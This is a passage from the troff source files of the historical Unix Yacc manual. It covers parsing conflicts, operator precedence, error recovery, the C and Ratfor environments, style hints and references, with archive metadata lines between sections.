end of file; in Ratfor, it makes no sense.
This type number cannot be redefined by the user; thus, all
lexical analyzers should be prepared to return 0 as a type number
upon reaching the end of their input.
-- /usr/doc/yacc/ss4 mode=0110664 uid=3 gid=3 atime=173059272 mtime=173059689 --
.SH
Section 4: Ambiguity, Conflicts, and Precedence
.PP
A set of grammar rules is
.ul
ambiguous
if there is some input string which can be structured in two or more different ways.
For example, the grammar rule
.DS
expr :  expr \'\-\' expr ;
.DE
is a natural way of expressing the fact that one way of forming an arithmetic expression
is to put two other expressions together with a minus sign between them.
Unfortunately, this grammar rule does not
completely specify the way that all complex inputs
should be structured.
For example, if we have input of the form
.DS
expr \- expr \- expr
.DE
the rule would permit us to treat this input either as
.DS
( expr \- expr ) \- expr
.DE
or as
.DS
expr \- ( expr \- expr )
.DE
(We speak of the first as
.ul
left association
of operators, and the second as
.ul
right association).
.PP
Yacc detects such ambiguities when it is attempting to build the parser.
It is instructive to consider the problem that confronts the parser when it is
given an input such as
.DS
expr \- expr \- expr
.DE
When the parser has read the second expr, the input which it has seen:
.DS
expr \- expr
.DE
matches the right side of the grammar rule above.
One valid thing for the parser to do is to
.ul
reduce
the input it has seen by applying this rule;
after applying the rule, it would have reduced the input it had already seen to expr (the left side of the rule).
It could then read the final part of the input:
.DS
\- expr
.DE
and again reduce by the rule.
We see that the effect of this is to take the left associative interpretation.
.PP
Alternatively, when the parser has seen
.DS
expr \- expr
.DE
it could defer the immediate application of the rule, and continue reading
(the technical term is
.ul
shifting)
the input until it had seen
.DS
expr \- expr \- expr
.DE
It could then apply the grammar rule to the rightmost three symbols, reducing them to expr and leaving
.DS
expr \- expr
.DE
Now it can reduce by the rule again; the effect is to
take the right associative interpretation.
Thus, having read
.DS
expr \- expr
.DE
the parser can do two legal things, a shift or a reduction, and has no way of
deciding between them.
We refer to this as a
.ul
shift/reduce conflict.
It may also happen that the parser has a choice of two legal reductions;
this is called a
.ul
reduce/reduce conflict.
.PP
When there are shift/reduce or reduce/reduce conflicts, Yacc still produces a parser.
It does this by selecting one of the valid steps wherever it has a choice.
A rule which describes which choice to make in a given situation is called
a
.ul
disambiguating rule.
.PP
Yacc has two disambiguating rules which are invoked by default,
in the absence of any user directives to the contrary:
.IP 1.
In a shift/reduce conflict, the default is to do the shift.
.IP 2.
In a reduce/reduce conflict, the default is to reduce by the
.ul
earlier
grammar rule (in the input sequence).
.PP
Rule 1 implies that reductions are deferred whenever there is a choice,
in favor of shifts.
Rule 2 gives the user rather crude control over the behavior of the parser
in this situation, but the proper use of reduce/reduce conflicts is still a black art, and is
properly considered an advanced topic.
.PP
Conflicts may arise because of mistakes in input or logic, or because the grammar rules, while consistent,
require a more complex parser than Yacc can construct.
In these cases, the application of disambiguating rules is inappropriate,
and leads to a parser which is in error.
For this reason, Yacc
always reports the number of shift/reduce and reduce/reduce conflicts which were resolved by Rule 1 and Rule 2.
.PP
In general, whenever it is possible to apply disambiguating rules to produce a correct parser, it is also
possible to rewrite the grammar rules so that the same inputs are read, but there are no
conflicts.
For this reason, most previous systems like Yacc
have considered conflicts to be fatal errors.
Our experience has suggested that this rewriting is somewhat unnatural to do,
and produces slower parsers; thus, Yacc will produce parsers even in the presence of conflicts.
.PP
As an example of the power of disambiguating rules, consider a fragment from a programming
language involving an
``if-then-else'' construction:
.DS
stat :	IF \'(\' cond \')\' stat |
	IF \'(\' cond \')\' stat ELSE stat ;
.DE
Here, we consider IF and ELSE to be tokens, cond to be a nonterminal symbol describing
conditional (logical) expressions, and
stat to be a nonterminal symbol describing statements.
In the following, we shall refer to these two rules as the
.ul
simple-if
rule and the
.ul
if-else
rule, respectively.
.PP
These two rules form an ambiguous construction, since input of the form
.DS
IF ( C1 ) IF ( C2 ) S1 ELSE S2
.DE
can be structured according to these rules in two ways:
.DS
IF ( C1 ) {
	IF ( C2 ) S1
}
ELSE S2
.DE
or
.DS
IF ( C1 ) {
	IF ( C2 ) S1
	ELSE S2
}
.DE
The second interpretation is the one given in most programming languages
which have this construct.
Each ELSE is associated with the last preceding ``un-ELSE'd'' IF.
In this example, consider the situation where the parser has seen
.DS
IF ( C1 ) IF ( C2 ) S1
.DE
and is looking at the ELSE.
It can immediately
.ul
reduce
by the simple-if rule to get
.DS
IF ( C1 ) stat
.DE
and then read the remaining input,
.DS
ELSE S2
.DE
and reduce
.DS
IF ( C1 ) stat ELSE S2
.DE
by the if-else rule.
This leads to the first of the above groupings of the input.
.PP
On the other hand, we may
.ul
shift
the ELSE and read S2, and then reduce the right hand portion of
.a
.DS
IF ( C1 ) IF ( C2 ) S1 ELSE S2
.DE
by the if-else rule to get
.DS
IF ( C1 ) stat
.DE
which can be reduced by the simple-if rule.
This leads to the second of the above groupings of the input, which
is usually desired.
.PP
Once again the parser can do two valid things \- we have a shift/reduce conflict.
The application of disambiguating rule 1 tells the parser to shift in this case,
which leads to the desired grouping.
.PP
Notice that this shift/reduce conflict arises only when there is a particular current input symbol,
ELSE, and particular inputs already seen, such as
.DS
IF ( C1 ) IF ( C2 ) S1
.DE
In general, there may be many conflicts, and each one
will be associated with an input symbol and
a set of previously read inputs.
The previously read inputs are characterized by the
.ul
state
of the parser, which is assigned a nonnegative integer.
The number of states in the parser is typically two to five times the number of grammar
rules.
.PP
When Yacc is invoked with the verbose
(\-v) option (see Appendix B), it produces a file of user output
which includes a description of the states in the parser.
For example, the output corresponding to the above
example might be:
.DS L
23: shift/reduce Conflict (Shift 45, Reduce 18) on ELSE

State 23

	stat : IF ( cond ) stat\_
	stat : IF ( cond ) stat\_ELSE stat

	ELSE	shift 45
	.		reduce 18

.DE
The first line describes the conflict, giving the state and the input symbol.
The state title follows, and a brief description of the grammar
rules which are active in this state.
The underline ``\_'' describes the
portions of the grammar rules which have been seen.
Thus in the example, in state 23 we have seen input which corresponds
to
.DS
IF ( cond ) stat
.DE
and the two grammar rules shown are active at this time.
The actions possible are, if the input symbol is ELSE, we may shift into state
45.
In this state, we should find as part of the description a line of the form
.DS
stat : IF ( cond ) stat ELSE\_stat
.DE
because in this state we will have read and shifted the ELSE.
Back in state 23, the alternative action, described by ``.'',
is to be done if the input symbol is not mentioned explicitly in the above actions; thus,
in this case, if the input symbol is not ELSE, we should reduce by grammar rule 18,
which is presumably
.DS
stat : IF \'(\' cond \')\' stat
.DE
Notice that the numbers following ``shift'' commands refer to other states,
while the numbers following ``reduce'' commands refer to grammar
rule numbers.
In most states, there will be only one reduce action possible in the
state, and this will always be the default command.
The user who encounters unexpected shift/reduce conflicts will probably want to
look at the verbose output to decide whether the default actions are appropriate.
In really tough cases, the user might need to know more about
the behavior and construction of the parser than can be covered here;
in this case, a reference such as [1]
might be consulted; the services of a local guru might also be appropriate.
.PP
There is one common situation
where the rules given above for resolving conflicts are not sufficient;
this is in the area of arithmetic expressions.
Most of the commonly used constructions for arithmetic expressions can be naturally
described by the notion of
.ul
precedence
levels for operators, together with information about left
or right associativity.
It turns out that ambiguous grammars with appropriate disambiguating rules
can be used to create parsers which are faster and easier to
write than parsers constructed from unambiguous grammars.
The basic notion is to write grammar rules
of the form
.DS
expr : expr OP expr
.DE
and
.DS
expr : UNARY expr
.DE
for all binary and unary operators desired.
This creates a very ambiguous grammar, with many parsing conflicts.
As disambiguating rules, the user specifies the precedence, or binding
strength, of all the operators, and the associativity
of the binary operators.
This information is sufficient to allow Yacc to resolve the parsing conflicts
in accordance with these rules, and construct a parser which realizes the desired
precedences and associativities.
.PP
The precedences and associativities are attached to tokens in the declarations section.
This is done by a series of lines beginning with a Yacc keyword: %left, %right,
or %nonassoc, followed by a list of tokens.
All of the tokens on the same line are assumed to have the same precedence level
and associativity; the lines are listed in
order of increasing precedence or binding strength.
Thus,
.DS
%left \'+\' \'\-\'
%left \'*\' \'/\'
.DE
describes the precedence and associativity of the four arithmetic operators.
Plus and minus are left associative, and have lower precedence than
star and slash, which are also left associative.
The keyword %right is used to describe right associative operators,
and the keyword %nonassoc is used to describe operators, like
the operator .LT. in Fortran, which may not associate with themselves; thus,
.DS
A .LT. B .LT. C
.DE
is illegal in Fortran, and such an operator would be described with the keyword
%nonassoc in Yacc.
As an example of the behavior of these declarations, the description
.DS
%right \'=\'
%left \'+\' \'\-\'
%left \'*\' \'/\'

%%

expr :
	expr \'=\' expr |
	expr \'+\' expr |
	expr \'\-\' expr |
	expr \'*\' expr |
	expr \'/\' expr |
	NAME ;
.DE
might be used to structure the input
.DS
a = b = c*d \- e \- f*g
.DE
as follows:
.DS
a = ( b = ( ((c*d)\-e) \- (f*g) ) )
.DE
When this mechanism is used,
unary operators must, in general, be given a precedence.
An interesting situation arises when we have a unary operator and a binary operator
which have the same symbolic representation, but different precedences.
An example is unary and binary \'\-\'; frequently, unary minus is given the same
strength as multiplication, or even higher, while binary minus has a lower strength than
multiplication.
We can indicate this situation by use of
another keyword, %prec, to change the precedence level associated with a particular grammar rule.
%prec appears immediately after the body of the grammar rule, before the action or closing semicolon,
and is followed by a token name or literal; it
causes the precedence of the grammar rule to become that of the token name or literal.
Thus, to make unary minus have the same precedence as multiplication, we might write:
.DS
%left \'+\' \'\-\'
%left \'*\' \'/\'

%%

expr :
	expr \'+\' expr |
	expr \'\-\' expr |
	expr \'*\' expr |
	expr \'/\' expr |
	\'\-\' expr %prec \'*\' |
	NAME ;
.DE
.PP
Notice that the precedences which are described
by %left, %right, and %nonassoc are independent of the declarations of token names
by %token.
A symbol can be declared by %token, and, later in the declarations section,
be given a precedence and associativity by one of the above methods.
It is true, however, that names which are given a precedence or associativity are
also declared to be token names, and so in general do not need to be
declared by %token, although it does not hurt to do so.
.PP
As we mentioned above, the precedences and associativities are used by Yacc to
resolve parsing conflicts; they give rise to disambiguating rules.
Formally, the rules work as follows:
.IP 1.
The precedences and associativities are recorded for those tokens and literals
which have them.
.IP 2.
A precedence and associativity is associated with each grammar rule; it is the precedence
and associativity of the last token or literal in the body of the rule.
If the %prec construction is used, it overrides this default.
Notice that some grammar rules may have no precedence and associativity associated with them.
.IP 3.
When there is a reduce/reduce conflict, or there is a shift/reduce conflict
and either the input symbol or the grammar rule, or both, has no precedence and associativity
associated with it, then the two disambiguating rules given at the beginning of the section are used,
and the conflicts are reported.
.IP 4.
If there is a shift/reduce conflict, and both the grammar rule and the input character
have precedence and associativity associated with them, then the conflict is resolved
in favor of the action (shift or reduce) associated with the higher precedence.
If the precedences are the same, then the associativity is used; left
associative implies reduce, right associative implies shift, and nonassociating
implies error.
.PP
There are a number of points worth making
about this use of disambiguation.
There is no reporting of conflicts which are resolved by this mechanism,
and these conflicts are not counted in the number of shift/reduce and reduce/reduce
conflicts found in the grammar.
This means that occasionally mistakes in the specification of precedences
disguise errors in the input grammar; it is a good idea to be sparing
with precedences, and use them in an essentially ``cookbook'' fashion,
until some experience has been gained.
Frequently, not enough operators or precedences have been specified;
this leads to a number of messages about shift/reduce or reduce/reduce conflicts.
The cure is usually to specify more precedences, or use the %prec mechanism, or both.
It is generally good to examine the verbose output file to ensure that
the conflicts which are being reported can be validly resolved by precedence.
-- /usr/doc/yacc/ss5 mode=0110664 uid=3 gid=3 atime=173059274 mtime=173059689 --
.SH
Section 5: Error Handling
.PP
Error handling is an extremely difficult area, and many of the problems are semantic ones.
When an error is found, for example, it may be necessary to reclaim parse tree storage,
delete or alter symbol table entries, and, typically, set switches to avoid putting out any further output.
.PP
It is generally not acceptable to stop all processing when an error is found; we wish to continue
scanning the input to find any further syntax errors.
This leads to the problem of getting the parser ``restarted'' after an error.
The general class of algorithms to do this involves reading ahead and discarding a number of tokens
from the input string, and attempting to adjust the parser so that input can continue.
.PP
To allow the user some control over this process,
Yacc provides a simple, but reasonably general, feature.
The token name ``error'' is reserved for error handling.
This name can be used in grammar rules;
in effect, it suggests places where errors are expected, and recovery might take place.
The parser attempts to find the last time in the input when the special
token ``error'' is permitted.
The parser then behaves as though it saw the token name ``error'' as an input token,
and attempts to parse according to the rule encountered.
The token at which the error was detected remains the next input token after this error token is processed.
If no special error rules have been specified, the processing effectively halts when an error is detected.
.PP
In order to prevent a cascade of error messages, the parser assumes that, after
detecting an error, it remains in error state until three tokens have been successfully
read and shifted.
If an error is detected when the parser is already in error state,
no error message is given, and the input token is quietly deleted.
.PP
As a common example, the user might include a rule of the form
.DS
statement :  error ;
.DE
in his specification.
This would, in effect, mean that on a syntax error the parser would attempt to skip over the statement
in which the error was seen.
(Notice, however, that it may be difficult or impossible to tell the end of a statement,
depending on the other grammar rules).
More precisely, the parser will
scan ahead, looking for three tokens that might legally follow
a statement, and start processing at the first of these; if
the beginnings of statements are not sufficiently distinctive, it may make a
false start in the middle of a statement, and end up reporting a
second error where there is in fact no error.
.PP
The user may supply actions after these special grammar rules,
just as after the other grammar rules.
These actions might attempt to reinitialize tables, reclaim symbol table space, etc.
.PP
The above form of grammar rule is very general, but
somewhat difficult to control.
Somewhat easier to deal with are rules of the form
.DS
statement :  error \';\'  ;
.DE
Here, when there is an error, the parser will again attempt to skip over the statement, but in
this case will do so by skipping to the next ``;''.
All tokens after the error and before the next ``;'' give syntax errors, and are discarded.
When the ``;'' is seen, this rule will be reduced, and any ``cleanup''
action associated with it will be performed.
.PP
Still another form of error rule arises in interactive applications, where
we may wish to prompt the user who has incorrectly input a line, and allow
him to reenter the line.
In C we might write:
.DS
inputline:	error \'\en\' prompt inputline
	= { $$ = $4; };

prompt:	/* matches no input */
	= {  printf( "Reenter last line: " ); };
.DE
There is one difficulty with this approach;
the parser must correctly process three input tokens before it is prepared to
admit that it has correctly resynchronized after the error.
Thus, if the reentered line contains errors
in the first two tokens, the parser will simply delete the offending tokens,
and give no message; this is clearly unacceptable.
For this reason, there is a mechanism in both C and Ratfor which
can be used to force the parser
to believe that resynchronization has taken place.
One need only include a statement of the form
.DS
yyerrok ;
.DE
in his action
after such a grammar rule, and the desired effect will take place;
this name will be expanded, using the ``# define'' mechanism of C or
the ``define'' mechanism of Ratfor, into an appropriate code sequence.
For example, in the situation discussed above where we
want to prompt the user to produce input,
we probably want to consider that the
original error has been recovered
when we have thrown away the previous line, including the newline.
In this case,
we can reset the error state before putting out the prompt message.
The grammar rule for the nonterminal symbol prompt becomes:
.DS
prompt:	/* matches no input */
	= {
		yyerrok;
		printf( "Reenter last line: " );
	} ;
.DE
.PP
There is another special feature which the user may
wish to use in error recovery.
As mentioned above, the token seen immediately
after the ``error'' symbol is the input token at which the
error was discovered.
Sometimes, this is seen to be inappropriate; for example, an
error recovery action might
take upon itself the job of finding the correct place to resume input.
In this case,
the user wishes a way of clearing the previous input token
held in the parser.
One need only include a
statement of the form
.DS
yyclearin ;
.DE
in his action; again, this expands, in both C and Ratfor, to the appropriate
code sequence.
For example, suppose the action after error
were to call some sophisticated resynchronization routine,
supplied by the user, which attempted to advance the input to the
beginning of the next valid statement.
After this routine was called, the next token returned by yylex would presumably
be the first token in a legal statement; we wish to throw away the
old, illegal token, and reset the error state.
We might do this by the sequence:
.DS
statement :  error 
	= { 
		resynch( );
		yyerrok ;
		yyclearin ;
	} ;
.DE
.PP
These mechanisms are admittedly crude, but do allow for a simple, fairly effective recovery of the parser
from many errors, and have the virtue that the user can get ``handles'' by which he can deal with
the error actions required by the lexical and output portions of the system.
-- /usr/doc/yacc/ss6c mode=0110664 uid=3 gid=3 atime=173059275 mtime=173059689 --
.SH
Section 6C: The C Language Yacc Environment
.PP
The default mode of operation in Yacc is to
write actions and the lexical
analyzer in C.
This has a number of advantages; primarily,
it is easier to write character handling
routines, such as the lexical analyzer, in a language
which supports character-by-character I/O, and has
shifting and masking operators.
.PP
When the user inputs a specification
to Yacc, the output is a file of C programs, called
``y.tab.c''.
These are then compiled, and loaded with a library;
the library has default versions of a number of useful
routines.
This section discusses these routines, and
how the user can write his own routines if desired.
The name of the Yacc library is system dependent; see Appendix B.
.PP
The subroutine produced by Yacc is called ``yyparse'';
it is an integer valued function.
When it is called, it in turn repeatedly calls ``yylex'', the lexical analyzer
supplied by the user (see Section 3),
to obtain input tokens.
Eventually, either an error is detected, in which case
(if no error recovery is possible)
yyparse returns the value 1,
or the lexical analyzer returns the endmarker token
(type number 0), and the parser accepts.
In this case, yyparse returns the value 0.
.PP
Three of the routines on the Yacc library are concerned with
the ``external'' environment of yyparse.
There is a default ``main'' program, a default ``initialization'' routine,
and a default ``accept'' routine, respectively.
They are so simple that they will be given here in their entirety:
.DS
main( argc, argv )
int argc;
char *argv[ ]
{
	yyinit( argc, argv );
	if( yyparse( ) )
		return;
	yyaccpt( );
}

yyinit( ) { }

yyaccpt( ) { }
.DE
By supplying his own versions of yyinit and/or yyaccpt,
the user can get control either before the parser is called
(to set options, open input files, etc.)
or after the accept action has been done
(to close files, call the next pass of the compiler, etc.).
Note that yyinit is called with the two ``command line'' arguments
which have been passed into the main program.
If neither of these routines is redefined,
the default situation simply looks like a call
to the parser, followed by the termination of the program.
Of course, in many cases the user will wish to supply his own
main program; for example, this is necessary if the
parser is to be called more than once.
.PP
The other major routine on the library
is called ``yyerror''; its main purpose is to write out a message
when a syntax error is detected.
It has a number of hooks and handles which attempt to
make this error message general and easy to
understand.
This routine is somewhat more complex, but still approachable:
.DS
extern int yyline;  /* input line number */

yyerror(s)
char *s;
{
	extern int yychar;
	extern char *yysterm[ ];

	printf("\en%s", s );
	if( yyline )
		printf(", line %d,", yyline );
	printf(" on input: ");
	if( yychar >= 0400 )
		printf("%s\en", yysterm[yychar\-0400] );
	else switch ( yychar ) {
	case \'\et\': printf( "\e\et\en" ); return;
	case \'\en\': printf( "\e\en\en" ); return;
	case \'\e0\': printf( "$end\en" ); return;
	default: printf( "%c\en" , yychar ); return;
	}
}
.DE
The argument to yyerror is a string containing an
error message; most usually, it is ``syntax error''.
yyerror also uses the external variables
yyline, yychar, and yysterm.
yyline is a line number which,
if set by the user to a nonzero number, will
be printed out as part of the error message.
yychar is a variable which contains the type number of the current
token.
yysterm has the names, supplied by the user, for all the tokens
which have names.
Thus, the routine spends most of its time
trying to print out a reasonable name for the input token.
The biggest problem with the routine as given is that,
on Unix, the error message does not go out on the
error file (file 2).
This is hard to arrange in such a way that it works with both
the portable I/O library and the system I/O library;
if a way can be worked out, the routine will be changed
to do this.
.ul
Beware:
This routine will not work if any token names
have been given redefined type numbers.
In this case, the user must supply his own yyerror routine.
Hopefully, this ``feature'' will disappear
soon.
.PP
Finally, there is another feature which the C user of Yacc might wish to use.
The integer variable yydebug is normally set to 0.
If it is set to 1, the parser will output a
verbose description of its actions, including
a discussion of which input symbols have been read, and
what the parser actions are.
Depending on the operating environment,
it may be possible to set this variable by using a debugging system.
-- /usr/doc/yacc/ss6r mode=0100664 uid=3 gid=3 atime=173059276 mtime=173059689 --
.SH
Section 6R: The Ratfor Language Yacc Environment
.PP
For reasons of portability or compatibility with existing
software, it may be desired to use Yacc to generate parsers
in Ratfor, or, by extension, in portable Fortran.
The user is likely to work considerably harder doing this
than he might if he were to use C.
.PP
When the user inputs a specification to Yacc, and specifies the Ratfor option (see Appendix B), the
output is a file of Ratfor programs called ``y.tab.r''.
These programs are then compiled,
and provide the desired subroutine.
.PP
The subroutine produced by Yacc which does the input process is an integer function
called ``yypars''.
When it is called,
it in turn repeatedly calls ``yylex'', the lexical analyzer supplied by the user
(see Section 3).
Eventually, either an error is detected, in which case (if no error recovery is possible)
yypars returns the value 1, or the lexical analyzer returns the
endmarker (type number 0), and the parser accepts.
In this case, yypars returns 0.
.PP
Unlike the C program situation
(see Section 6C) there is no library
of Ratfor routines which must be used in the loading process.
As a side effect of this,
.ul
the user must supply a main program which calls yypars.
A suggested Ratfor main program is
.DS
integer yypars
n = yypars(0)
if( n .EQ. 0 ) {
	. . .  here if the program accepted
} else {
	. . .  here if there were unrecoverable errors
}
end
.DE
Notice that there is no easy way for the user to get control when
an error is detected, since the Fortran language provides only
a very crude character string capability.
.PP
There is another feature which the Ratfor user
might wish to use.
The argument to yypars is normally 0.
If it is set to 1, the parser will output a verbose description of its actions,
including a discussion of which input symbols have been read,
and what the parser actions are.
During the input process, the value of this debug flag
is kept in a common variable yydebu, which
is available to the actions and may be set and reset at will.
.PP
Statement labels 1 through 1000 are reserved for the
parser, and may not appear in actions; note that, because Ratfor
has a more modern control structure than Fortran, it is rarely necessary
to use statement labels at all; the most frequent use of labels in Ratfor is
in formatted I/O.
.PP
Because Fortran has no standard character set
and not even a standard character width,
it is difficult to produce a lexical analyzer
in portable Fortran
The usual solution is to provide a routine
which does a table search to get the internal type number for each input character,
with the understanding that such a routine can be recoded to run far faster for any particular machine.
.PP
Finally, we must warn the user that the Ratfor feature of Yacc
has been operational for a much shorter time than the
other portions of the system.
If past experience is any
guide, the Ratfor support will develop and become more
powerful and better human engineered in response to user complaints and requirements.
Thus, the potential Ratfor user might do well to contact
the author to discuss his own particular needs.
-- /usr/doc/yacc/ss7 mode=0110664 uid=3 gid=3 atime=173059278 mtime=173059689 --
.SH
Section 7. Hints for Preparing Specifications
.PP
This section contains miscellaneous hints on preparing efficient, easy to change,
and clear specifications.
The individual subsections are, more or less,
independent; the reader seeing Yacc for the first
time may well find that
this entire section could be omitted.
.SH
Input Style
.PP
It is difficult to
input rules with substantial actions
and still have a readable specification file.
The following style hints owe much to Brian Kernighan,
and are officially endorsed by the author.
.IP a.
Use all capital letters for token names, all lower case letters for
nonterminal names.
This rule comes under the heading of ``knowing who to blame when
things go wrong.``
.IP b.
Put grammar rules and actions on separate lines.
This allows either to be changed without
an automatic need to change the other.
.IP c.
Put all rules with the same left hand side together.
Put the left hand side in only once, and let all
following rules begin with a vertical bar.
.IP d.
Indent rule bodies by one tab stop, and action bodies by two tab stops.
.PP
The example in Appendix A is written following this style, as are
the examples in the text of this paper (where space permits).
The user must make up his own mind about these stylistic questions;
the central problem, however, is to make the rules visible through
the morass of action code.
.SH
Common Actions
.PP
When several grammar rules have the same action, the user might well wish to
provide only one code sequence.
A simple, general mechanism is, of course, to use subroutine calls.
It is also possible to put a label on the first statement of an action,
and let other actions be simply a goto to this
label.
Thus, if the user had a routine which built trees,
he might wish to have only one call to it, as follows:
.DS
expr :
	expr \'+\' expr =
	{  binary:
		$$ = btree( $1, $2, $3 );
	} |
	expr \'\-\' expr =
	{
		goto binary;
	} |
	expr \'*\' expr =
	{
		goto binary;
	} ;
.DE
.SH
Left Recursion
.PP
The algorithm used by the Yacc parser encourages so called ``left recursive''
grammar rules: rules of the form
.DS
name : name rest\_of\_rule ;
.DE
These rules frequently arise when
writing specifications of sequences and lists:
.DS
list :
	item |
	list \',\' item ;
.DE
and
.DS
sequence :
	item |
	sequence item ;
.DE
Notice that, in each of these cases, the first rule
will be reduced for the first item only, and the second rule
will be reduced for the second and all succeeding items.
.PP
If the user were to write these rules right recursively, such as
.DS
sequence :
	item |
	item sequence ;
.DE
the parser would be a bit bigger, and the items would be seen, and reduced,
from right to left.
More seriously, an internal stack in the parser
would be in danger of overflowing if a very long sequence were read.
Thus, the user should use left recursion wherever reasonable.
.PP
The user should also consider whether a sequence with zero
elements has any meaning, and if so, consider writing
the sequence specification with an empty rule:
.DS
sequence :
	| /* empty */
	sequence item ;
.DE
Once again, the first rule would always be reduced exactly once, before the
first item was read,
and then the second rule would be reduced once for each item read.
Experience suggests that permitting empty sequences
leads to increased generality, which frequently is not evident at the
time the rule is first written.
There are cases, however, when the Yacc algorithm can fail when
such a change is made.
In effect, conflicts might arise when Yacc is asked to decide
which empty sequence it has seen, when it hasn\'t seen enough to
know!
Nevertheless,
this principle is still worth following wherever possible.
.SH
Lexical Tie-ins
.PP
Frequently, there are lexical decisions which depend on the
presence of various constructions in the specification.
For example, the lexical analyzer might want to
delete blanks normally, but not within quoted strings.
Or names might be entered into a symbol table in declarations,
but not in expressions.
.PP
One way of handling these situations is
to create a global flag which is
examined by the lexical analyzer, and set by actions.
For example, consider a situation where we have a program which
consists of 0 or more declarations, followed by 0 or more statements.
We declare a flag called ``dflag'', which is 1 during declarations, and 0 during
statements.
We may do this as follows:
.DS
%{
	int dflag ;
%}
%%
program :
	decls  stats ;

decls :
	= /* empty */
	{
		dflag = 1;
	} |
	decls declaration ;

stats :
	= /* empty */
	{
		dflag = 0;
	} |
	stats statement ;

	. . .  other rules . . .
.DE
The flag dflag is now set to zero when reading statements, and 1 when reading declarations,
.ul
except for the first token in the first statement.
This token must be seen by the parser before it can tell that
the declaration section has ended and the statements have
begun.
Frequently, however, this single token exception does not
affect the lexical scan required.
.PP
Clearly, this kind of ``backdoor'' approach can be elaborated on
to a noxious degree.
Nevertheless, it represents a way of doing some things
that are difficult, if not impossible, to
do otherwise.
.SH
Bundling
.PP
Bundling is a technique for collecting together various character strings
so that they can be output at some later time.
It is derived from a feature of the same name in the compiler/compiler TMG [6].
.PP
Bundling has two components \- a nice user interface,
and a clever implementation trick.
They will be discussed in that order.
.PP
The user interface consists of two routines, ``bundle'' and ``bprint''.
.DS
bundle( a1, a2, . . ., an )
.DE
accepts a variable number of arguments which are either character strings or bundles, and
returns a bundle,
whose value will be the concatenation of the values of a1, . . ., an.
.DS
bprint( b )
.DE
accepts a bundle as argument and outputs its value.
.PP
For example, suppose that we wish to read arithmetic expressions, and output
function calls to routines called ``add'', ``sub'',
``mul'', ``div'', and ``assign''.
Thus, we wish to translate
.DS
a = b \- c*d
.DE
into
.DS
assign(a,sub(b,mul(c,d)))
.DE
.PP
A Yacc specification file which does this is given in Appendix D; this includes
an implementation of the bundle and bprint
routines.
A rule and action of the form
.DS
expr:
	expr \'+\' expr =
	{
		$$ = bundle( "add(", $1, ",", $3, ")" );
	}
.DE
causes the returned value of
expr to be come a bundle, whose value is the
character string containing the desired function call.
Each NAME token has a value which is a pointer to the
actual name which has been read.
Finally, when the entire input line has been read
and the value has been bundled,
the value is written out
and the bundles and names
are cleared, in preparation for the next input line.
.PP
Bundles are implemented as arrays of pointers, terminated by a zero pointer.
Each pointer either points to a bundle or to a character string.
There is an array, called
.ul
bundle space,
which contains all the bundles.
.PP
The implementation trick is to check the values of the pointers in bundles \-
if the pointer points into bundle space, it is assumed to point to a bundle;
otherwise it is assumed to point to a character string.
.PP
The treatment of functions with a variable number of arguments, like bundle,
is likely to differ from one implementation of C to another.
.PP
In general, one may wish to have a simple storage allocator which
allocates and frees bundles,
in order to handle situations where it is not appropriate to completely
clear all of bundle space at one time.
.SH
Reserved Words
.PP
Some programming languages
permit the user to
use words like ``if'', which are normally reserved,
as label or variable names, provided that such use does not
conflict with the legal use of these names in the programming language.
This is extremely hard to do in the framework of Yacc,
since it is difficult to pass the required information to the lexical analyzer
which tells it ``this instance of if is a keyword, and that instance is a variable''.
The user can make a stab at it, using the
mechanism described in the last subsection,
but it is difficult.
.PP
A number of ways of making this easier are under advisement, and one
will probably be supported eventually.
Until this day comes, I suggest that the keywords be
.ul
reserved;
that is, be forbidden for use as variable names.
There are powerful stylistic reasons for preferring this, anyway
(he said weakly . . . ).
.SH
Non-integer Values
.PP
Frequently, the user wishes to have values which are
bigger than integers;
again, this is an area where Yacc does not make the job as easy as it might,
and some additional support is likely.
Nevertheless, at the cost of writing a storage manager,
the user can return pointers or indices to blocks of storage
big enough to contain the full values desired.
.SH
Previous Work
.PP
There have been many previous applications of Yacc.
The user who is contemplating a big application might well
find that others have developed relevant techniques,
or even portions of grammars.
Yacc specifications appear to be easier to change than
the equivalent computer programs, so that the ``prior art'' is more
relevant here as well.
-- /usr/doc/yacc/ss8 mode=0100664 uid=3 gid=3 atime=173059279 mtime=173059690 --
.SH
Section 8: User Experience, Summary, and Acknowledgements
.PP
Yacc has been used in the construction of a C compiler for the Honeywell 6000,
a system for typesetting mathematical equations, a low level implementation language
for the PDP 11, APL and Basic compilers to run under the UNIX system,
and a number of other applications.
.PP
To summarize, Yacc can be used to construct parsers;
these parsers can interact in a fairly flexible way with the lexical analysis and output
phases of a larger system.
The system also provides an indication of ambiguities in the specification, and allows disambiguating rules
to be supplied to resolve these ambiguities.
.PP
Because the output of Yacc is largely tables, the system is relatively language independent.
In the presence of reasonable applications, Yacc could be modified or adapted to
produce subroutines for other machines and languages.
In addition, we continue to seek better algorithms to improve the lexical analysis
and code generation phases of compilers produced using
Yacc.
.PP
This document would be incomplete if I did not give credit to a
most stimulating collection of users, who have goaded
me beyond my inclination, and frequently beyond my
ability, in their endless search for ``one more feature''.
Their irritating unwillingness to learn how to
do things my way has usually led to my doing things their way;
most of the time, they have been right.
B. W. Kernighan, P. J. Plauger, S. I. Feldman, C. Imagna,
M. E. Lesk,
and A. Snyder will recognize some of their ideas in the current version
of Yacc.
Al Aho also deserves recognition for bringing
the mountain to Mohammed, and other favors.
-- /usr/doc/yacc/ss9 mode=0100664 uid=3 gid=3 atime=173059280 mtime=173059690 --
.bp
.SH
References
.IP 1
Aho, A.V. and Johnson, S.C., ``LR Parsing'', Computing Surveys,
Vol 6, No 2, June 1974, pp. 99-124.
.IP 2
Aho, A.V., Johnson, S.C., and Ullman, J.D., ``Deterministic Parsing of Ambiguous Grammars'',
Proceedings of the A.C.M. Symposium on Principles of
Programming Languages, October 1973, pp. 1-21; to appear in CACM.
.IP 3
Aho, A.V. and Ullman, J.D., Theory of Parsing, Translation, and Compiling.
Volume 1 (1972) and Volume 2 (1973), Prentice-Hall, Englewood Cliffs, N.J.
.IP 4
Kernighan, B. W., Ratfor, a Rational Fortran
.IP 5
Ryder, B. B., ``The PFORT Verifier,'' Software\-Practice and Experience, Vol 4 (1974), pp 359-377.
.IP 6
McIlroy, M. D., A Manual for the TMG Compiler-writing Language
.IP 7
Ritchie, D. M., C Reference Manual
.bp
-- /usr/doc/yacc/ssa mode=0100664 uid=3 gid=3 atime=173059281 mtime=173059690 --
.SH
Appendix A:  A Simple Example
.PP
This example gives the complete Yacc specification for a small desk calculator;
the desk calculator has 26 registers, labeled a through z, and accepts
